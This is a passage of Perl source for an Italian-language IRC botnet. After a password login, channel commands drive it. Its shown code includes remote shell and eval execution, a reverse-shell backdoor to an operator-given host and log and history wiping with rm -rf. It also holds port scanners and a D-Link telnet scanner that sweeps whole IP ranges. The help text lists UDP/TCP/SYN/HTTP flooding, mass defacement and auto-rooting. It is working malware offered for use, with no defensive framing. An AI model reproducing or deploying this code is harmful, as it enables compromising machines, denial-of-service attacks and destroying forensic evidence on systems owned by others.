    $port = $serv[2] || $defport || $pnum;
    unless (defined $port) {
	$@ = "Bad service '$origport'";
	return;
    }

    $proto = _get_proto_number($serv[3]) if @serv && !$proto;
  }

 return ($addr || undef,
	 $port || undef,
	 $proto || undef
	);
}

sub _error {
    my $sock = shift;
    my $err = shift;
    {
      local($!);
      my $title = ref($sock).": ";
      $@ = join("", $_[0] =~ /^$title/ ? "" : $title, @_);
      $sock->close()
	if(defined fileno($sock));
    }
    $! = $err;
    return undef;
}

sub _get_addr {
    my($sock,$addr_str, $multi) = @_;
    my @addr;
    if ($multi && $addr_str !~ /^\d+(?:\.\d+){3}$/) {
	(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);
    } else {
	my $h = inet_aton($addr_str);
	push(@addr, $h) if defined $h;
    }
    @addr;
}

sub configure {
    my($sock,$arg) = @_;
    my($lport,$rport,$laddr,$raddr,$proto,$type);


    $arg->{LocalAddr} = $arg->{LocalHost}
	if exists $arg->{LocalHost} && !exists $arg->{LocalAddr};

    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},
					$arg->{LocalPort},
					$arg->{Proto})
			or return _error($sock, $!, $@);

    $laddr = defined $laddr ? inet_aton($laddr)
			    : INADDR_ANY;

    return _error($sock, $EINVAL, "Bad hostname '",$arg->{LocalAddr},"'")
	unless(defined $laddr);

    $arg->{PeerAddr} = $arg->{PeerHost}
	if exists $arg->{PeerHost} && !exists $arg->{PeerAddr};

    unless(exists $arg->{Listen}) {
	($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},
					    $arg->{PeerPort},
					    $proto)
			or return _error($sock, $!, $@);
    }

    $proto ||= _get_proto_number('tcp');

    $type = $arg->{Type} || $socket_type{lc _get_proto_name($proto)};

    my @raddr = ();

    if(defined $raddr) {
	@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});
	return _error($sock, $EINVAL, "Bad hostname '",$arg->{PeerAddr},"'")
	    unless @raddr;
    }

    while(1) {

	$sock->socket(AF_INET, $type, $proto) or
	    return _error($sock, $!, "$!");

        if (defined $arg->{Blocking}) {
	    defined $sock->blocking($arg->{Blocking})
		or return _error($sock, $!, "$!");
	}

	if ($arg->{Reuse} || $arg->{ReuseAddr}) {
	    $sock->sockopt(SO_REUSEADDR,1) or
		    return _error($sock, $!, "$!");
	}

	if ($arg->{ReusePort}) {
	    $sock->sockopt(SO_REUSEPORT,1) or
		    return _error($sock, $!, "$!");
	}

	if ($arg->{Broadcast}) {
		$sock->sockopt(SO_BROADCAST,1) or
		    return _error($sock, $!, "$!");
	}

	if($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {
	    $sock->bind($lport || 0, $laddr) or
		    return _error($sock, $!, "$!");
	}

	if(exists $arg->{Listen}) {
	    $sock->listen($arg->{Listen} || 5) or
		return _error($sock, $!, "$!");
	    last;
	}

 	# don't try to connect unless we're given a PeerAddr
 	last unless exists($arg->{PeerAddr});
 
        $raddr = shift @raddr;

	return _error($sock, $EINVAL, 'Cannot determine remote port')
		unless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);

	last
	    unless($type == SOCK_STREAM || defined $raddr);

	return _error($sock, $EINVAL, "Bad hostname '",$arg->{PeerAddr},"'")
	    unless defined $raddr;

#        my $timeout = ${*$sock}{'io_socket_timeout'};
#        my $before = time() if $timeout;

	undef $@;
        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {
#            ${*$sock}{'io_socket_timeout'} = $timeout;
            return $sock;
        }

	return _error($sock, $!, $@ || "Timeout")
	    unless @raddr;

#	if ($timeout) {
#	    my $new_timeout = $timeout - (time() - $before);
#	    return _error($sock,
#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),
#                         "Timeout") if $new_timeout <= 0;
#	    ${*$sock}{'io_socket_timeout'} = $new_timeout;
#        }

    }

    $sock;
}

sub connect {
    @_ == 2 || @_ == 3 or
       croak 'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)';
    my $sock = shift;
    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));
}

sub bind {
    @_ == 2 || @_ == 3 or
       croak 'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)';
    my $sock = shift;
    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))
}

sub sockaddr {
    @_ == 1 or croak 'usage: $sock->sockaddr()';
    my($sock) = @_;
    my $name = $sock->sockname;
    $name ? (sockaddr_in($name))[1] : undef;
}

sub sockport {
    @_ == 1 or croak 'usage: $sock->sockport()';
    my($sock) = @_;
    my $name = $sock->sockname;
    $name ? (sockaddr_in($name))[0] : undef;
}

sub sockhost {
    @_ == 1 or croak 'usage: $sock->sockhost()';
    my($sock) = @_;
    my $addr = $sock->sockaddr;
    $addr ? inet_ntoa($addr) : undef;
}

sub peeraddr {
    @_ == 1 or croak 'usage: $sock->peeraddr()';
    my($sock) = @_;
    my $name = $sock->peername;
    $name ? (sockaddr_in($name))[1] : undef;
}

sub peerport {
    @_ == 1 or croak 'usage: $sock->peerport()';
    my($sock) = @_;
    my $name = $sock->peername;
    $name ? (sockaddr_in($name))[0] : undef;
}

sub peerhost {
    @_ == 1 or croak 'usage: $sock->peerhost()';
    my($sock) = @_;
    my $addr = $sock->peeraddr;
    $addr ? inet_ntoa($addr) : undef;
}

1;
}

###Starting the bot##


###IRC

restart:
my @logged=();
my @login_failed = ();
my $socket = connessione ($server,$port,$nick,$ident,$realname,$chan_pwd); #Establishing The connection with the server



#The Cycle who manage the connection

while($line = <$socket>){
    #print $line;
	

	## Ping? ##
    
	if ($line=~ /^PING \:(.*)/) {
		print $socket "PONG :$1\n";
	}
    
	## Pong! ##
    
    ## Events ##
	##motd end, joining channels##
    if ($line =~ m/^\:(.+?)\s+376/i) {
		foreach my $canale(@canali){
			sleep 5;
			my ($c,$p)=split(/\|/,$canale);
			printf $socket "JOIN $c $p\r\n";
			#printf $socket "CHANNEL $c $p\n";
		}
     }
    ## Nick Event ##
    
    if ($line =~ m/^\:(.+?)\s+433/i) {
        
        $nick = genick();
        
        printf $socket "NICK $nick\n";
        printf $socket "QUIT\n";
    }

    if ($line =~ m/^\:(.+?)\s+431/i) {
        
        $nick = genick();
        
        printf $socket "NICK $nick\n";
        printf $socket "QUIT\n";
    }
    
   ## Users Event ##

	if ($line =~ m/^.*353.*\:(.*)/i) {

			my $utenti=$1;
			$utenti=~s/\~|\@|\&|\+|\%//g;
			my @nicks=split(/\s/,$utenti);

	}

	## Privmsg Events ##
    
	if($line=~/^:(.+)\!.+ PRIVMSG (.+) :(.*)/i){
		$user = $1;
		$where = $2;
		$command = $3;
		if ($where eq $nick){
			$where = $user;
		}
        	chop $command;
		parse($user,$where,$command);
	}
    
    
    ## Part Event ##
	if($line=~/^:(.+)\!.+ PART (.+)\b/){
		$section="Logout";
		$part=$1; 
		        for ($[..$#logged) {
				if ($logged[$_] eq $part){
				splice(@logged, $_, 1) ;
				}
			}
       
	}

	## JOIN Event ##
	if($line=~/^:(.+)\!.+ JOIN (.+)\b/){
		$join=$1;      
	}

    ##Change Nick Event##

	if($line=~/^:(.+)\!.+ NICK :(.+)\b/){
		$old_nick=$1;
		$new_nick=$2;	
		        for ($[..$#logged) {
				   if ($logged[$_] eq $old_nick){
				   	$logged[$_]=$new_nick;
				   }
		        }
	}
    
    ## Quit Event ##
    
	if($line=~/^:(.+)\!.+ QUIT (.+)\b/){
		$section="Logout";
		$quit=$1; 
			for ($[..$#logged) {
				if ($logged[$_] eq $quit){
				splice(@logged, $_, 1) ;
				}
			}
	}

    ##MODE EVENT##

	if($line=~/^:.+\!.+MODE\s+(.+?)\s\+(.*?)\s\b/){
	

	
	}

	if($line=~/^:.+\!.+MODE\s+(.+?)\s\-(.+?)\s+(.*)\b/){
	
	
	}
    
    ## End Events ##
    
}
goto restart;
#End Of The Management

#######################################################
#######################################################
###################The Bot Core########################
#######################################################
#######################################################

#The Parse Function, The core of the bot

sub parse {
    #Global Parse Variable
	my $user = $_[0];
	my $where = $_[1];
	my $command = $_[2];
    #End Of Global Parse Variable

	##Memory of commands##
	if(@memory>$memory_size){ delete $memory[0]; }
	push(@memory,"$user|$where|$command");
	##End of Memory##

	if($command =~ /^.rfiscan\s+(.*?)\s+(.*)/i){
        
        #######################################################
        #######################################################
        #######################Fork############################
        #######################################################
        #######################################################
        
	my $bug = $1;
	my $dork = $2;
	if (my $pid = fork) {
	    waitpid($pid, 0);
	    } else {
	        if (fork) {
	            exit;
            } else {
                #RfiScanner should wait for now.
	        } 
        exit; 
    }
        
	} elsif ($command =~ /^.login (.*)/i){ #!login
    
        #######################################################
        #######################################################
        #######################Login###########################
        #######################################################
        #######################################################
        $section="Login";
        $pass=$1;
        if (check($user)){  
            msg($where,$section,"$user You are already logged in");
        } else {            
            if (crypt($pass,$password) eq $password){
                for ($[..$#logged) {
                    splice(@logged, $_, 1) if $logged[$_] =~ /$user/;
                } 
                    push (@logged,$user);
                    msg($where,$section,"$user Successfully Logged in");
		    		secure($user);
			    foreach my $try(@login_failed){
					msg($where,$section,"Hey, $try Tryed to Login Here!");
			    }
		    	@login_failed=();
                } else {
                    msg($where,$section,"$user Wrong Password");
		    		push(@login_failed,$user);
                }
        }
        
	} elsif ($command =~ /^.logout/i){ #!logout
        
        #######################################################
        #######################################################
        #######################Logout##########################
        #######################################################
        #######################################################
        $section="Logout";
             for ($[..$#logged) {
               splice(@logged, $_, 1) if $logged[$_] eq $user;
           } 
            msg($where,$section,"$user Logged Out");
            
	} elsif ($command =~ /^.help/i){
        
        #######################################################
        #######################################################
        ########################Help###########################
        #######################################################
        #######################################################
        $section="Help";
        if(check($user)){
            
            msg($where,$section,"The List Of commands requested by $user:");
            msg($where,$section,"!login password - User Login in to bot.");
            msg($where,$section,"!logout - User Logout from the bot.");
            msg($where,$section,"!linux - Alcuni comandi utili sui sistemi Unix-Like.");
            msg($where,$section,"!system - Informazioni sul sistema operativo.");
            msg($where,$section,"!exploits - Lista gli ultimi exploit di milw0rm.com.");
            msg($where,$section,"!portscanner ip - Scanning sulle porte pi� frequenti sull'ip dato.");
            msg($where,$section,"!nmap ip portainizio portafine - Scanning sulle porte indicate sull'ip dato.");
            msg($where,$section,"!tracedelete - Cancella i Log.");
            msg($where,$section,"!join chan - Joina sul canale indicato.");
            msg($where,$section,"!part chan - Esce dal canale indicato.");
            msg($where,$section,"!processo proc - Cambia il nome del processo in quello indicato.");
            msg($where,$section,"#comando - Esegue comando.");
            msg($where,$section,"!eval eval - Eval di un comando (per utenti esperti).");
            msg($where,$section,"!rebewt - Riavvio del bot.");
	    msg($where,$section,"!cd dir - Cambia Directory di lavoro.");
            msg($where,$section,"!nick nuovonick - Cambia il nick del bot.");
            msg($where,$section,"!raw comando - Invia comandi raw al server.");
            msg($where,$section,"!adminlist - Lista admin.");
            msg($where,$section,"!back ip porta  - Backdoor.");
            msg($where,$section,"!udpflood ip porta tempo - Dossa per tot tempo l'ip indicato sulla porta indicata.");
            msg($where,$section,"!tcpflood ip porta tempo - Dossa per tot tempo l'ip indicato sulla porta indicata.");
	    msg($where,$section,"!synflood ip ip_source pacchetti porta - Syn Flood.");
	    msg($where,$section,"!download url nomefile - Scarica il l'url e lo salva nel file indicato nella cartella corrente.");
	    msg($where,$section,"!oldudpflood ip pacchetti tempo - Dossa per tot tempo l'ip indicato con la dimenzione di tot pacchetti in Kb.");
	    msg($where,$section,"!httpflood ip tempo - Dossa per tot tempo l'ip indicato.");
	    msg($where,$section,"!mail soggetto mittente destinatario messaggio - Manda una mail con i dati indicati.");
	    msg($where,$section,"!massdeface - MassDeface del sito con la variabile dichiarata prima.");
	    msg($where,$section,"!root - Sono rootabile?.");
            msg($where,$section,"!massroot - Tentativo di AutoRooTing!.");
            msg($where,$section,"!scan 1 2 3 4- Scanner Dlink!.");
	    msg($where,$section,"!cran 1 2 3- Scanner Dlink!.");
	    msg($where,$section,"!bran 1 2- Scanner Dlink!.");
	    msg($where,$section,"!exploit - Dlink Exploited!.");
	    msg($where,$section,"!lod 80.x.x.x or 80.3.x.x or 6.4.5.x or x.x.x.x (don't be lame!) - Dlink Scanner");
	    msg($where,$section,"!quit - Killa il Bot.");
	    msg($where,$section,"Http5 Version ");
	    
        } else {
            
            msg($where,$section,"Devi Loggarti per effettuare questo comando.");
            
        }
    
    } elsif ($command =~ /^.adminlist/i){
        
        #######################################################
        #######################################################
        ########################AdminList######################
        #######################################################
        #######################################################
        $section="AdminList";
        
        if(check($user)){
            
            msg($where,$section,"Start of List:");
            
            foreach $log (@logged){
            msg($where,$section,"$log"); 
            }
           
            msg($where,$section,"End Of List.");
            
        } else {
            
            msg($where,$section,"Devi Loggarti per effettuare questo comando.");
            
        }
        
	} elsif ($command =~ /^.linux/i){
        
        #######################################################
        #######################################################
        ########################Linux##########################
        #######################################################
        #######################################################
        
        $section="Linux";
            if(check($user)){
                msg($where,$section,"Dove sei? : pwd");
                msg($where,$section,"Lancia un file perl : perl file.pl");
                msg($where,$section,"Torna alla directory madre : cd ..");
                msg($where,$section,"Cancella una cartella o file, dopo lista il contenuto : rm -rf file/dir;ls -la");
                msg($where,$section,"Lista Processi : ps aux");
                msg($where,$section,"Scrive il contenuto di una directory : ls -lia");
                msg($where,$section,"Cerca config.inc.php files : find / -type f -name config.inc.php");
                msg($where,$section,"Cerca tutti i file scrivibili : find / -perm -2 -ls");
                msg($where,$section,"Cerca tutti .htpasswd files : find / -type f -name .htpasswd");
                msg($where,$section,"Cerca tutti service.pwd files : find / -type f -name service.pwd");
            } else {
                
                msg($where,$section,"Devi Loggarti per effettuare questo comando.");
                
            }
            
	} elsif ($command =~ /^.system/i){
        
        
        #######################################################
        #######################################################
        ########################System#########################
        #######################################################
        #######################################################
        
        
        $section="SystemInformation";
        
            if(check($user)){
                msg($where,$section,"Server : $server");
                msg($where,$section,"Port : $porta");
                msg($where,$section,"Nick : $nick");
                msg($where,$section,"Canali : @canali");
                msg($where,$section,"Uname -a : $uname");
                msg($where,$section,"PID : $$");
                msg($where,$section,"Uptime : $uptime");
                msg($where,$section,"Own Process : $processo");
                msg($where,$section,"ID : $id");
                msg($where,$section,"Own Dir : $ownd");
                msg($where,$section,"OS : $distro");
                if ($sprelink or $sprepath){
                    msg($where,$section,"Link Spreader : $sprelink");
                    msg($where,$section,"Path Spreader : $sprepath");
                
                }
    
            } else {
                
                msg($where,$section,"Devi Loggarti per effettuare questo comando.");
                
            }
        
    } elsif ($command =~ /^.exploits/i){
        
        
        #######################################################
        #######################################################
        ########################Exploits##########################
        #######################################################
        #######################################################
        
        
        $section="Milw0rm.com";
        
        if(check($user)){
            if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
                    ##Exploit
                    my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
                    print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
                    my @r = <$socke>;
                    $result="@r";
                    @content=split(/<item>/,$result);
                        foreach $riga (@content){
                            if($riga=~/<title>([^<]+)/){
                                $expl=$1;
                                    if($expl!~/^mil/){
                                        $expl=~s/\&lt\;/</;
                                    }
                            }
                            if($riga=~/<guid>([^<]+)/){
                                $guid=$1;
                                    if($guid!~/^mil/){
                                        $guid=~s/\&lt\;/</;
                                        msg($where,$section,"$expl - $guid");
                                    }
                            }
                        }
                    ##Exploit                	        
                } 
            exit; 
            }
            
       } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }   
        
	 } elsif ($command =~ /^.exploit/i){
		
		
		#######################################################
		#######################################################
		########################Exploit##########################
		#######################################################
		#######################################################
		
		
		$section="Exploited";
		
		if(check($user)){
	
		msg($where,$section,"Exploitati in totale -> $totexp .");
		    
	       } else {
	    
		msg($where,$section,"Devi Loggarti per effettuare questo comando.");
	    
		}   


    } elsif ($command =~ /^.portscanner (.*)/i){
        
        #######################################################
        #######################################################
        #####################Port Scanner######################
        #######################################################
        #######################################################
        
        
        $section="PortScanner";
        
        $target="$1";        
        if(check($user)){
            if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
                    ##Scanner
                    my
                    @porte=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
                    msg($where,$section,"Scanning di $target");
                        foreach my $porta (@porte)  {
                            my $scanner = IO::Socket::INET->new(PeerAddr => $target, PeerPort => $porta, Proto =>
                            'tcp', Timeout => 4);
                                if ($scanner) {
                                  msg($where,$section,"Porta $porta Aperta.");
                                  $scanner->close;
                                }
                        }
                    msg($where,$section,"Terminato Scanning su $target");
                    ##Scanner
                } 
                exit; 
            }
            
       } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }   
        
    } elsif ($command =~ /^.nmap\s+(.*)\s+(\d+)\s+(\d+)/i){
        
        #######################################################
        #######################################################
        #####################Nmap##############################
        #######################################################
        #######################################################
        
        my $target="$1";
        my $portstart = "$2";
        my $portend = "$3";
        
        $section="Nmap";
        
        if(check($user)){
            if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
                    ##Scanner
                msg($where,$section,"Scanning di $target");
                        foreach my $porta ($portstart..$portend)  {
                            my $scanner = IO::Socket::INET->new(PeerAddr => $target, PeerPort => $porta, Proto =>
                            'tcp', Timeout => 4);
                                if ($scanner) {
                                  msg($where,$section,"Porta $porta Aperta.");
                                  $scanner->close;
                                }
                        }
                    msg($where,$section,"Terminato Scanning su $target");
                    ##Scanner
                } 
                exit; 
            }
            
       } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        } 
        
        
        
    } elsif ($command =~ /^.tracedelete/i){
        
        #######################################################
        #######################################################
        #####################TraceDelete#######################
        #######################################################
        #######################################################
        
        
        $section="TraceDelete";
        
        if(check($user)){
            if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
                    
                    ##TraceDelete
                    msg($where,$section,"Questo Processo Potrebbe Richiedere del tempo, Aspetta per favore"); 
                    system 'rm -rf /var/log/lastlog';
                    msg($where,$section,"Ho Rimosso: /var/log/lastlog"); 
                    system 'rm -rf /var/log/wtmp';
                    msg($where,$section,"Ho Rimosso: /var/log/wtmp"); 
                    system 'rm -rf /etc/wtmp';
                    msg($where,$section,"Ho Rimosso: /etc/wtmp"); 
                    system 'rm -rf /var/run/utmp';
                    msg($where,$section,"Ho Rimosso: /var/run/utmp"); 
                    system 'rm -rf /etc/utmp';
                    msg($where,$section,"Ho Rimosso: /etc/utmp"); 
                    system 'rm -rf /var/log';
                    msg($where,$section,"Ho Rimosso: /var/log"); 
                    system 'rm -rf /var/logs';
                    msg($where,$section,"Ho Rimosso: /var/logs"); 
                    system 'rm -rf /var/adm';
                    msg($where,$section,"Ho Rimosso: /var/adm"); 
                    system 'rm -rf /var/apache/log';
                    msg($where,$section,"Ho Rimosso: /var/apache/log"); 
                    system 'rm -rf /var/apache/logs';
                    msg($where,$section,"Ho Rimosso: /var/apache/logs"); 
                    system 'rm -rf /usr/local/apache/log'; 
                    msg($where,$section,"Ho Rimosso: /usr/local/apache/log"); 
                    system 'rm -rf /usr/local/apache/logs';
                    msg($where,$section,"Ho Rimosso: /usr/local/apache/logs"); 
                    system 'rm -rf /root/.bash_history';
                    msg($where,$section,"Ho Rimosso: /root/.bash_history"); 
                    system 'rm -rf /root/.ksh_history';
                    msg($where,$section,"Ho Rimosso: /root/.ksh_history"); 
                    msg($where,$section,"Tutti I file di default per i log sono stati cancellati."); 
                    msg($where,$section,"Ora cancello i rimanenti Log sulla macchina.");
                    system 'find / -name *.bash_history -exec rm -rf {} \;';
                    msg($where,$section,"Ho Rimosso: *.bash_history"); 
                    system 'find / -name *.bash_logout -exec rm -rf {} \;';
                    msg($where,$section,"Ho Rimosso: *.bash_logout"); 
                    system 'find / -name "log*" -exec rm -rf {} \;';
                    msg($where,$section,"Ho Rimosso: log*"); 
                    system 'find / -name *.log -exec rm -rf {} \;';
                    msg($where,$section,"Ho Rimosso: *.log"); 
                    msg($where,$section,"Tutti i file di log sono stati cancellati."); 
                    ##TraceDelete
                } 
                exit; 
            }
            
       } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
        
	} elsif ($command =~ /^.join (.*)/i){
        
        
        #######################################################
        #######################################################
        #####################Join##############################
        #######################################################
        #######################################################
        
        
        $section="Join";
        my $channel=$1;
        
        if(check($user)){
            
            msg($where,$section,"Joining channel $channel");
            printf $socket "join $channel\n";
	    push(@canali,$channel);
            
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
        
    } elsif ($command =~ /^.raw (.*)/i){
        
        
        #######################################################
        #######################################################
        #####################RAW###############################
        #######################################################
        #######################################################
        
        
        $section="RAW";
        my $raw=$1;
        
        if(check($user)){
            
            msg($where,$section,"Executing raw $raw");
            printf $socket "$raw\n";
            
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
        
    } elsif ($command =~ /^.nick (.*)/i){
    
    
    #######################################################
    #######################################################
    #####################Nick##############################
    #######################################################
    #######################################################
    
    
    $section="Nick";
    my $new_nick=$1;
    
    if(check($user)){
        
        msg($where,$section,"Changing the nick to $new_nick");
        printf $socket "NICK $new_nick\n";
        $nick=$new_nick;
        
        
    } else {

    msg($where,$section,"Devi Loggarti per effettuare questo comando.");

    }
            
	} elsif ($command =~ /^.part (.*)/i){
        
        
        #######################################################
        #######################################################
        ##########################Part#########################
        #######################################################
        #######################################################
        
        
        $section="Part";
        my $channel=$1;
        
        if(check($user)){
            
            msg($where,$section,"Parting from channel $channel");
            printf $socket "part $channel\n";
            
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
        
    } elsif ($command =~ /^.back\s+(.*)\s+(\d+)/i){
        
        
        #######################################################
        #######################################################
        #####################BackDoor##########################
        #######################################################
        #######################################################
        
        
        $section="BackConnect";
        my $host = "$1";
        my $porta = "$2";
        
        if(check($user)){
            if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
                    
		use Socket;
                my $proto = getprotobyname('tcp');
                my $iaddr = inet_aton($host);
                my $paddr = sockaddr_in($porta, $iaddr);
                my $shell = "/bin/sh -i";
                if ($^O eq "MSWin32") {
                  $shell = "cmd.exe";
                }
                socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or msg($where,$section,"socket : $!");
                connect(SOCKET, $paddr) or msg($where,$section,"socket : $!");
                open(STDIN, ">&SOCKET");
                open(STDOUT, ">&SOCKET");
                open(STDERR, ">&SOCKET");
                system("$shell");
                close(STDIN);
                close(STDOUT);
                close(STDERR);
                msg($where,$section,"Connecting to $host:$porta");
            } 
                exit; 
            }
    
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
        
        
    } elsif ($command =~ /^\#(.*)/i){
        
        #######################################################
        #######################################################
        #####################Shell#############################
        #######################################################
        #######################################################
        
        $comando=$1;
        $section="Shell";
        
        if(check($user)){
        
              if ($comando =~ /cd (.*)/) {
                chdir("$1") || msg($where,$section,"Directory Inesistente");
                return;
              } elsif ($pid = fork) {
                 waitpid($pid, 0);
              } else {
                  if (fork) {
                     exit;
                   } else {
                       my @resp=`$comando 2>&1 3>&1`;
                       my $c=0;
                       foreach my $linha (@resp) {
                       sleep 1;
                         $c++;
                         chop $linha;
                         #printf $socket "PRIVMSG $where :$linha\n";
                         msg($where,$section," $linha");
                         if ($c == "$linas_max") {
                           $c=0;
                           sleep $sleep;
                         }
                       }
                       exit;
                   }
              }
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
        
                
	} elsif ($command =~ /^.processo\s+(.*)/i){
        
        #######################################################
        #######################################################
        #####################Processo##########################
        #######################################################
        #######################################################
        
        $section="Processo";
        
        if(check($user)){
            
            $processo=$1;
            $0=$processo;
            msg($where,$section,"Processo Cambiato a $processo.");
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
        
	} elsif ($command =~ /^.eval\s+(.*)/i){
        
        
        #######################################################
        #######################################################
        #####################Eval##############################
        #######################################################
        #######################################################
        
        
        $section="Eval";
        
        if(check($user)){
            
            eval($1);
            msg($where,$section,"Eval di $1 completato.");
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
        
	} elsif ($command =~ /^.rebewt/i){
        
        
        
        #######################################################
        #######################################################
        #####################RebeWt##############################
        #######################################################
        #######################################################
        
        
        $section="Rebewt";
        
        if(check($user)){
            
            msg($where,$section,"Riavvio del bot in corso.");
            printf $socket "QUIT\n";
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
	
	} elsif ($command =~ /^.cd\s+(.*)/i){
        
        
        
        #######################################################
        #######################################################
        #####################Dir################################
        #######################################################
        #######################################################
        
	$dir=$1;
        
        $section="Dir";
        
        if(check($user)){
		
	    chdir($dir);
            msg($where,$section,"Directory Cambiata in $dir.");
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }

	} elsif ($command =~ /^.scan\s+(.*?)\s+(.*)\s+(.*)\s+(.*)/i){
        
        
        
        #######################################################
        #######################################################
        #####################scan################################
        #######################################################
        #######################################################
        
          $ip1=$1; 
          $ip2=$2;
          $ip3=$3;
          $ip4=$4;
        
        $section="ScAn";
        
        if(check($user)){

	            if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
            
            
       		 my $a=&scan($ip1,$ip2,$ip3,$ip4,$section,$where);
            	$totexp=$totexp+$a;
            } 
                exit; 
            }   
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }

	} elsif ($command =~ /^.lod\s+(.*)/i){
        
        
        
        #######################################################
        #######################################################
        #####################LoD###############################
        #######################################################
        #######################################################

	$range=$1;
        
	my @classi = split(/\./,$range);

	
	my $ip1=$classi[0];
	my $ip2=$classi[1];
	my $ip3=$classi[2];
	my $ip4=$classi[3];
        
        $section="LoD";
        
        if(check($user)){

	    if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
            
            msg($where,$section,"Scanner Dlink Started with Range $range !");
       		 if($ip1 eq "x"){

		for ($x=0;$x<=255;$x++){

			for ($a=0;$a<=255;$a++){

				for ($b=0;$b<=255;$b++){


					for ($c=0;$c<=255;$c++){

					my $ipbase= $x . "\." . $a . "\." . $b . "\." . $c;
if ($a== 1){
		msg($where,$section,"Trying $ipbase");
}
if ($b == 1){
		msg($where,$section,"Trying $ipbase");
}
if ($c == 1){
		msg($where,$section,"Trying $ipbase");
}
if ($x== 1){
		msg($where,$section,"Trying $ipbase");
}

  $debug=1;  
              # printf "\nCurrent Ip ->".$ipexp;
               my $sk2 = IO::Socket::INET->new(PeerAddr=>"$ipbase",PeerPort=>"23",Proto=>"tcp", Timeout => 3) or $debug=0;
               if($debug == 1)
               {
                    msg($where,$section,"Connect aT:7 $ipbase 9OkI! ");
						    if (my $pid = fork) {
				waitpid($pid, 0);
			    } else {
				if (fork) {
				    exit;
				} else {
				&dlink($ipbase,$sk2,$section,$where);
				} 
					exit; 
				    }   
                    
                    $totexp++;
               }else
               {
 #                   msg($where,$section,"Exploiting aT:7 $ipexp 12FaiLeD! bY Net-Warriors Crew");    // OFF :| 
               }
				

					}


				}

			}

		}

		} elsif ($ip2 eq "x"){

		for ($a=0;$a<=255;$a++){

			for ($b=0;$b<=255;$b++){


				for ($c=0;$c<=255;$c++){

					my $ipbase= $ip1 . "\." . $a . "\." . $b . "\." . $c;
if ($a== 1){
		msg($where,$section,"Trying $ipbase");
}
if ($b == 1){
		msg($where,$section,"Trying $ipbase");
}
if ($c == 1){
		msg($where,$section,"Trying $ipbase");
}

					  $debug=1;  
              # printf "\nCurrent Ip ->".$ipexp;
               my $sk2 = IO::Socket::INET->new(PeerAddr=>"$ipbase",PeerPort=>"23",Proto=>"tcp", Timeout => 3) or $debug=0;
               if($debug == 1)
               {
                    msg($where,$section,"Connect aT:7 $ipbase 9OkI! ");
						    if (my $pid = fork) {
				waitpid($pid, 0);
			    } else {
				if (fork) {
				    exit;
				} else {
				&dlink($ipbase,$sk2,$section,$where);
				} 
					exit; 
				    }   
                    
                    $totexp++;
               }else
               {
 #                   msg($where,$section,"Exploiting aT:7 $ipexp 12FaiLeD! bY Net-Warriors Crew");    // OFF :| 
               }

				}


			}

		}


		} elsif ($ip3 eq "x"){

			for ($b=0;$b<=255;$b++){


				for ($c=0;$c<=255;$c++){

		
		

				my $ipbase= $ip1 . "\." . $ip2 . "\." . $b . "\." . $c;
if ($b == 1){
		msg($where,$section,"Trying $ipbase");
}
if ($c == 1){
		msg($where,$section,"Trying $ipbase");
}

				  $debug=1;  
              # printf "\nCurrent Ip ->".$ipexp;
               my $sk2 = IO::Socket::INET->new(PeerAddr=>"$ipbase",PeerPort=>"23",Proto=>"tcp", Timeout => 3) or $debug=0;
               if($debug == 1)
               {
